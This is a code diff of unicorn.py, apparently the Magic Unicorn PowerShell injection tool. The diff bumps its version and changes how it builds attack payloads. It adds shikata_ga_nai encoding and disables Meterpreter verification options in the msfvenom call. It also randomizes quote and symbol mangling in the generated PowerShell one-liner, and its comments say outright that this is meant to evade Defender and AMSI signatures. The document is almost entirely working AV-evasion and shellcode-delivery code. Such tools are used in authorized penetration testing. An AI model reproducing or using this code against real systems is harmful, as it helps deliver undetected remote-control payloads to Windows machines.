@@ -491,7 +491,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.6.11 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.7 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -782,8 +782,7 @@ def generate_shellcode(payload, ipaddr, port):
 
         # gen random number for length
         uri_length=generate_random_number(3,6)
-
-        proc = subprocess.Popen("msfvenom -p {0} {1} {2} --platform windows --smallest -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        proc = subprocess.Popen("msfvenom -p {0} {1} {2} --platform windows -e x86/shikata_ga_nai --smallest -f c AutoLoadStdapi=false AutoSystemInfo=false AutoVerifySession=false StagerVerifySSLCert=false".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         data = proc.communicate()[0]
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
         #data = data.decode("ascii").replace('"\\xfc', '"', 1)
@@ -926,7 +925,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     Win32 = mangle_word("Win32Functions")
 
     # here we do a little magic to get around AMSI, no more cat and mouse game here by chunking of shellcode, it's not needed since Defender and AMSI is still signature driven primarily
-    random_symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
+    random_symbols = ['!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
     mangle_shellcode = (random.choice(random_symbols))
 
     #mangle_shellcode = generate_random_string(1, 1).upper()
@@ -989,7 +988,10 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         haha_av = haha_av.replace("==", "'+'==")
         counter = 1
 
-    full_attack = '''powershell /w 1 /C "s''v {0} -;s''v {1} e''c;s''v {2} ((g''v {3}).value.toString()+(g''v {4}).value.toString());powershell (g''v {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+    random_quotes = ["''", '\\"\\"' ]
+    mangle_quotes = (random.choice(random_quotes))
+
+    full_attack = '''powershell /w 1 /C "s{0}v {1} -;s{0}v {2} e{0}c;s{0}v {3} ((g{0}v {4}).value.toString()+(g{0}v {5}).value.toString());powershell (g{0}v {6}).value.toString() (\''''.format(mangle_quotes,ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
 
     # for cobalt strike
